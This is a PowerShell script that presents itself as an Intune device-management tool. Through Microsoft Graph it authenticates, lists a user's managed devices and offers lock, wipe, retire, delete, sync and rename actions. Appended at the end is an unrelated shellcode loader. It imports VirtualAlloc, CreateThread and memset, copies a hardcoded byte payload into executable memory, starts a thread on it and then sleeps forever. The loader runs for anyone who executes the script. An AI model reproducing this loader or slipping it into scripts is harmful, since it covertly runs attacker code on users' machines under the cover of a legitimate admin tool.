




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Get-AADUser(){



[cmdletbinding()]

param
(
    $userPrincipalName,
    $Property
)


$graphApiVersion = "v1.0"
$User_resource = "users"

    try {

        if($userPrincipalName -eq "" -or $userPrincipalName -eq $null){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

        }

        else {

            if($Property -eq "" -or $Property -eq $null){

            $uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)/$userPrincipalName"
            Write-Verbose $uri
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get

            }

            else {

            $uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)/$userPrincipalName/$Property"
            Write-Verbose $uri
            (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

            }

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Get-AADUserDevices(){



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true,HelpMessage="UserID (guid) for the user you want to take action on must be specified:")]
    $UserID
)


$graphApiVersion = "beta"
$Resource = "users/$UserID/managedDevices"

    try {

    $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
    Write-Verbose $uri
    (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Invoke-DeviceAction(){



[cmdletbinding()]

param
(
    [switch]$RemoteLock,
    [switch]$ResetPasscode,
    [switch]$Wipe,
    [switch]$Retire,
    [switch]$Delete,
    [switch]$Sync,
    [switch]$Rename,
    [Parameter(Mandatory=$true,HelpMessage="DeviceId (guid) for the Device you want to take action on must be specified:")]
    $DeviceID
)

$graphApiVersion = "Beta"

    try {

        $Count_Params = 0

        if($RemoteLock.IsPresent){ $Count_Params++ }
        if($ResetPasscode.IsPresent){ $Count_Params++ }
        if($Wipe.IsPresent){ $Count_Params++ }
        if($Retire.IsPresent){ $Count_Params++ }
        if($Delete.IsPresent){ $Count_Params++ }
        if($Sync.IsPresent){ $Count_Params++ }
        if($Rename.IsPresent){ $Count_Params++ }

        if($Count_Params -eq 0){

        write-host "No parameter set, specify -RemoteLock -ResetPasscode -Wipe -Delete -Sync or -rename against the function" -f Red

        }

        elseif($Count_Params -gt 1){

        write-host "Multiple parameters set, specify a single parameter -RemoteLock -ResetPasscode -Wipe -Delete or -Sync against the function" -f Red

        }

        elseif($RemoteLock){

        $Resource = "deviceManagement/managedDevices/$DeviceID/remoteLock"
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($resource)"
        write-verbose $uri
        Write-Verbose "Sending remoteLock command to $DeviceID"
        Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post

        }

        elseif($ResetPasscode){

            write-host
            write-host "Are you sure you want to reset the Passcode this device? Y or N?"
            $Confirm = read-host

            if($Confirm -eq "y" -or $Confirm -eq "Y"){

            $Resource = "deviceManagement/managedDevices/$DeviceID/resetPasscode"
            $uri = "https://graph.microsoft.com/$graphApiVersion/$($resource)"
            write-verbose $uri
            Write-Verbose "Sending remotePasscode command to $DeviceID"
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post

            }

            else {

            Write-Host "Reset of the Passcode for the device $DeviceID was cancelled..."

            }

        }

        elseif($Wipe){

        write-host
        write-host "Are you sure you want to wipe this device? Y or N?"
        $Confirm = read-host

            if($Confirm -eq "y" -or $Confirm -eq "Y"){

            $Resource = "deviceManagement/managedDevices/$DeviceID/wipe"
            $uri = "https://graph.microsoft.com/$graphApiVersion/$($resource)"
            write-verbose $uri
            Write-Verbose "Sending wipe command to $DeviceID"
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post

            }

            else {

            Write-Host "Wipe of the device $DeviceID was cancelled..."

            }

        }

        elseif($Retire){

        write-host
        write-host "Are you sure you want to retire this device? Y or N?"
        $Confirm = read-host

            if($Confirm -eq "y" -or $Confirm -eq "Y"){

            $Resource = "deviceManagement/managedDevices/$DeviceID/retire"
            $uri = "https://graph.microsoft.com/$graphApiVersion/$($resource)"
            write-verbose $uri
            Write-Verbose "Sending retire command to $DeviceID"
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post

            }

            else {

            Write-Host "Retire of the device $DeviceID was cancelled..."

            }

        }

        elseif($Delete){

        write-host
        Write-Warning "A deletion of a device will only work if the device has already had a retire or wipe request sent to the device..."
        Write-Host
        write-host "Are you sure you want to delete this device? Y or N?"
        $Confirm = read-host

            if($Confirm -eq "y" -or $Confirm -eq "Y"){

            $Resource = "deviceManagement/managedDevices('$DeviceID')"
            $uri = "https://graph.microsoft.com/$graphApiVersion/$($resource)"
            write-verbose $uri
            Write-Verbose "Sending delete command to $DeviceID"
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Delete

            }

            else {

            Write-Host "Deletion of the device $DeviceID was cancelled..."

            }

        }
        
        elseif($Sync){

        write-host
        write-host "Are you sure you want to sync this device? Y or N?"
        $Confirm = read-host

            if($Confirm -eq "y" -or $Confirm -eq "Y"){

            $Resource = "deviceManagement/managedDevices('$DeviceID')/syncDevice"
            $uri = "https://graph.microsoft.com/$graphApiVersion/$($resource)"
            write-verbose $uri
            Write-Verbose "Sending sync command to $DeviceID"
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post

            }

            else {

            Write-Host "Sync of the device $DeviceID was cancelled..."

            }

        }

        elseif($Rename){

        write-host "Please type the new device name:" -ForegroundColor Yellow
        $NewDeviceName = Read-Host

$JSON = @"

{
    deviceName:"$($NewDeviceName)"
}

"@

        write-host
        write-host "Note: The RenameDevice remote action is only supported on supervised iOS devices"
        write-host "Are you sure you want to rename this device to" $($NewDeviceName) "(Y or N?)"
        $Confirm = read-host

            if($Confirm -eq "y" -or $Confirm -eq "Y"){

            $Resource = "deviceManagement/managedDevices('$DeviceID')/setDeviceName"
            $uri = "https://graph.microsoft.com/$graphApiVersion/$($resource)"
            write-verbose $uri
            Write-Verbose "Sending rename command to $DeviceID"
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post -Body $Json -ContentType "application/json"

            }

            else {

            Write-Host "Rename of the device $DeviceID was cancelled..."

            }

        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





write-host
write-host "User Principal Name:" -f Yellow
$UPN = Read-Host

write-host

$User = Get-AADUser -userPrincipalName $UPN

$id = $User.Id
write-host "User ID:"$id





Write-Host
Write-Host "Checking if the user" $User.displayName "has any devices assigned..." -ForegroundColor DarkCyan

$Devices = Get-AADUserDevices -UserID $id





if($Devices){

$DeviceCount = @($Devices).count

Write-Host
Write-Host "User has $DeviceCount devices added to Intune..."
Write-Host

    if($Devices.id.count -gt 1){

    $Managed_Devices = $Devices.deviceName | sort -Unique

    $menu = @{}

    for ($i=1;$i -le $Managed_Devices.count; $i++) 
    { Write-Host "$i. $($Managed_Devices[$i-1])" 
    $menu.Add($i,($Managed_Devices[$i-1]))}

    Write-Host
    [int]$ans = Read-Host 'Enter Device id (Numerical value)'
    $selection = $menu.Item($ans)

        if($selection){

        $SelectedDevice = $Devices | ? { $_.deviceName -eq "$Selection" }

        $SelectedDeviceId = $SelectedDevice | select -ExpandProperty id

        write-host "User" $User.userPrincipalName "has device" $SelectedDevice.deviceName
        
        
        
        
        

        }

    }

    elseif($Devices.id.count -eq 1){

        write-host "User" $User.userPrincipalName "has one device" $Devices.deviceName
        
        
        
        
        

    }

}

else {

Write-Host
write-host "User $UPN doesn't have any owned Devices..." -f Yellow

}

write-host




$mSE3 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $mSE3 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xcb,0xbe,0x73,0x99,0x57,0x34,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x72,0x14,0x03,0x72,0x67,0x7b,0xa2,0xc8,0x6f,0xf9,0x4d,0x31,0x6f,0x9e,0xc4,0xd4,0x5e,0x9e,0xb3,0x9d,0xf0,0x2e,0xb7,0xf0,0xfc,0xc5,0x95,0xe0,0x77,0xab,0x31,0x06,0x30,0x06,0x64,0x29,0xc1,0x3b,0x54,0x28,0x41,0x46,0x89,0x8a,0x78,0x89,0xdc,0xcb,0xbd,0xf4,0x2d,0x99,0x16,0x72,0x83,0x0e,0x13,0xce,0x18,0xa4,0x6f,0xde,0x18,0x59,0x27,0xe1,0x09,0xcc,0x3c,0xb8,0x89,0xee,0x91,0xb0,0x83,0xe8,0xf6,0xfd,0x5a,0x82,0xcc,0x8a,0x5c,0x42,0x1d,0x72,0xf2,0xab,0x92,0x81,0x0a,0xeb,0x14,0x7a,0x79,0x05,0x67,0x07,0x7a,0xd2,0x1a,0xd3,0x0f,0xc1,0xbc,0x90,0xa8,0x2d,0x3d,0x74,0x2e,0xa5,0x31,0x31,0x24,0xe1,0x55,0xc4,0xe9,0x99,0x61,0x4d,0x0c,0x4e,0xe0,0x15,0x2b,0x4a,0xa9,0xce,0x52,0xcb,0x17,0xa0,0x6b,0x0b,0xf8,0x1d,0xce,0x47,0x14,0x49,0x63,0x0a,0x70,0xbe,0x4e,0xb5,0x80,0xa8,0xd9,0xc6,0xb2,0x77,0x72,0x41,0xfe,0xf0,0x5c,0x96,0x01,0x2b,0x18,0x08,0xfc,0xd4,0x59,0x00,0x3a,0x80,0x09,0x3a,0xeb,0xa9,0xc1,0xba,0x14,0x7c,0x7f,0xbe,0x82,0xbf,0x28,0xc1,0x57,0x28,0x2b,0xc2,0x56,0x13,0xa2,0x24,0x08,0x33,0xe5,0xf8,0xe8,0xe3,0x45,0xa9,0x80,0xe9,0x49,0x96,0xb0,0x11,0x80,0xbf,0x5a,0xfe,0x7d,0x97,0xf2,0x67,0x24,0x63,0x63,0x67,0xf2,0x09,0xa3,0xe3,0xf1,0xee,0x6d,0x04,0x7f,0xfd,0x19,0xe4,0xca,0x5f,0x8f,0xfb,0xe0,0xca,0x2f,0x6e,0x0f,0x5d,0x78,0x06,0x0d,0xb8,0x4e,0x89,0xee,0xef,0xc5,0x00,0x7b,0x50,0xb1,0x6c,0x6b,0x50,0x41,0x3b,0xe1,0x50,0x29,0x9b,0x51,0x03,0x4c,0xe4,0x4f,0x37,0xdd,0x71,0x70,0x6e,0xb2,0xd2,0x18,0x8c,0xed,0x15,0x87,0x6f,0xd8,0xa7,0xfb,0xb9,0x24,0xd2,0x15,0x7a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$hj1=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($hj1.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$hj1,0,0,0);for (;;){Start-sleep 60};

